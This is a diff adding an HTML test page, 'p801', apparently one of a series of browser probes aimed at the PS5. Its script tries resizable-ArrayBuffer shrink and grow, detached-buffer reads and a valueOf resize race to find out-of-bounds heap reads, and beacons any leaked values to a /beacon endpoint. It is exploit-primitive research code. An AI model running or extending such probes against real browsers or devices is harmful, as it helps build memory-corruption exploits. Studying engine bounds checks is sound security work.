@@ -1,0 +1,158 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p801</title></head>
+<body><pre id="out">p801: ResizableArrayBuffer OOB read after shrink</pre>
+<script>
+'use strict';
+/*
+  p801: Test if TypedArray/DataView reads leak heap data after buffer operations
+  -- ResizableArrayBuffer confirmed on PS5 (p601)
+  -- structuredClone+transfer confirmed (p630)
+  -- If bounds checks are wrong after resize/detach, we get OOB reads
+
+  CRASH_CLASS: LOW — bounds check failures are usually safe (throw or return 0)
+*/
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,d){
+  var msg='P801-'+tag+(d!==undefined?'-'+String(d).slice(0,400):'');
+  say(msg);
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon/P801-'+encodeURIComponent(tag+(d!==undefined?'-'+String(d).slice(0,400):''))+'?t='+Date.now(),false);x.send(null);}catch(e){
+    try{new Image().src='/beacon/P801-'+encodeURIComponent(msg.slice(0,200))+'?t='+Date.now();}catch(e2){}}
+}
+function f64hex(v){
+  var b=new ArrayBuffer(8);new Float64Array(b)[0]=v;var u=new Uint32Array(b);
+  return ((u[1]>>>0).toString(16)).padStart(8,'0')+((u[0]>>>0).toString(16)).padStart(8,'0');
+}
+
+bk('START',navigator.userAgent);
+
+// Phase A: ResizableArrayBuffer shrink + TypedArray OOB read
+bk('A-START','RAB shrink OOB');
+try {
+  var rab = new ArrayBuffer(4096, {maxByteLength: 4096});
+  bk('A-RAB','created '+rab.byteLength+'B, resizable='+rab.resizable);
+  var u8 = new Uint8Array(rab);
+  var u64 = new BigUint64Array(rab);
+  var f64 = new Float64Array(rab);
+  // Fill with pattern
+  for(var i=0;i<u8.length;i++) u8[i]=0x41;
+  bk('A-FILL','filled 4096B with 0x41');
+  // Shrink
+  rab.resize(64);
+  bk('A-SHRUNK','new size='+rab.byteLength);
+  // Try reading OOB through typed arrays
+  var oobVals=[];
+  for(var j=8;j<512;j++){
+    try{
+      var v=u8[j];
+      if(v!==undefined&&v!==0){oobVals.push('['+j+']=0x'+v.toString(16));}
+    }catch(e){}
+    if(oobVals.length>=10) break;
+  }
+  bk('A-OOB-U8',oobVals.length>0?oobVals.join(' '):'all-undef-or-zero');
+  // BigUint64Array OOB
+  var oob64=[];
+  for(var k=8;k<64;k++){
+    try{
+      var v2=u64[k];
+      if(v2!==undefined&&v2!==0n){oob64.push('['+k+']=0x'+v2.toString(16));}
+    }catch(e){}
+    if(oob64.length>=5) break;
+  }
+  bk('A-OOB-U64',oob64.length>0?oob64.join(' '):'all-undef-or-zero');
+  // Float64Array OOB
+  var oobF=[];
+  for(var m=8;m<64;m++){
+    try{
+      var v3=f64[m];
+      if(v3!==undefined&&v3!==0&&v3===v3){oobF.push('['+m+']='+f64hex(v3));}
+    }catch(e){}
+    if(oobF.length>=5) break;
+  }
+  bk('A-OOB-F64',oobF.length>0?oobF.join(' '):'all-undef-or-zero');
+  // DataView OOB
+  var dv=new DataView(rab);
+  var dvOob=[];
+  for(var n=64;n<512;n+=8){
+    try{var v4=dv.getBigUint64(n,true);if(v4!==0n)dvOob.push('['+n+']=0x'+v4.toString(16));}catch(e){if(dvOob.length===0)dvOob.push('threw@'+n);}
+    if(dvOob.length>=5)break;
+  }
+  bk('A-OOB-DV',dvOob.join(' ')||'empty');
+} catch(e) { bk('A-ERR',e.message.slice(0,60)); }
+
+// Phase B: structuredClone + transfer → read detached buffer
+bk('B-START','clone+detach read');
+try {
+  var ab1 = new ArrayBuffer(256);
+  var view1 = new BigUint64Array(ab1);
+  for(var i=0;i<view1.length;i++) view1[i]=0x4242424242424242n;
+  // Transfer detaches ab1
+  var ab2 = structuredClone(ab1, {transfer:[ab1]});
+  bk('B-DETACH','ab1.byteLength='+ab1.byteLength+' ab2.byteLength='+ab2.byteLength);
+  // Try reading from detached ab1 via the old typed array
+  var detachVals=[];
+  try{
+    for(var j=0;j<32;j++){
+      var v=view1[j];
+      if(v!==undefined&&v!==0n)detachVals.push('['+j+']=0x'+v.toString(16));
+      if(detachVals.length>=5)break;
+    }
+  }catch(e){detachVals.push('threw:'+e.message.slice(0,30));}
+  bk('B-DETACH-READ',detachVals.length>0?detachVals.join(' '):'all-undef');
+  // DataView on detached
+  try{
+    var dv2=new DataView(ab1);
+    bk('B-DETACH-DV','created DataView on detached!');
+  }catch(e){bk('B-DETACH-DV','threw:'+e.message.slice(0,40));}
+} catch(e) { bk('B-ERR',e.message.slice(0,60)); }
+
+// Phase C: RAB grow into freed region
+bk('C-START','RAB grow into freed');
+try {
+  // Create many RABs, free some, grow survivors into freed space
+  var rabs=[];
+  for(var i=0;i<50;i++){
+    rabs.push(new ArrayBuffer(256,{maxByteLength:4096}));
+    new Uint8Array(rabs[i]).fill(0xCC);
+  }
+  // Free odd-indexed
+  for(var i=1;i<50;i+=2) rabs[i]=null;
+  // GC pressure
+  for(var i=0;i<1000;i++) new ArrayBuffer(1024);
+  // Grow even-indexed into potentially freed space
+  var leakFound=false;
+  for(var i=0;i<50;i+=2){
+    if(!rabs[i])continue;
+    try{
+      rabs[i].resize(4096);
+      var view=new BigUint64Array(rabs[i]);
+      // Check newly accessible region (256..4096) for non-CC data
+      for(var k=32;k<512;k++){
+        if(view[k]!==0n&&view[k]!==0xCCCCCCCCCCCCCCCCn){
+          bk('C-LEAK','rab['+i+']['+k+']=0x'+view[k].toString(16));
+          leakFound=true;break;
+        }
+      }
+    }catch(e){}
+    if(leakFound)break;
+  }
+  if(!leakFound)bk('C-CLEAN','all zeros or 0xCC in grown region');
+} catch(e) { bk('C-ERR',e.message.slice(0,60)); }
+
+// Phase D: valueOf race during TypedArray set
+bk('D-START','valueOf race');
+try{
+  var rab2=new ArrayBuffer(256,{maxByteLength:4096});
+  var ta=new BigUint64Array(rab2);
+  var poison={valueOf:function(){rab2.resize(64);return 0x1234n;}};
+  try{ta[16]=poison;bk('D-WRITE','ta[16] after resize='+ta[16]);}catch(e){bk('D-WRITE','threw:'+e.message.slice(0,40));}
+  // Check if the write went OOB
+  rab2.resize(4096);
+  var found=false;
+  for(var i=8;i<512;i++){
+    if(ta[i]===0x1234n){bk('D-HIT','found 0x1234 at ['+i+']');found=true;break;}
+  }
+  if(!found)bk('D-MISS','0x1234 not found');
+}catch(e){bk('D-ERR',e.message.slice(0,60));}
+
+bk('DONE','complete');
+</script></body></html>
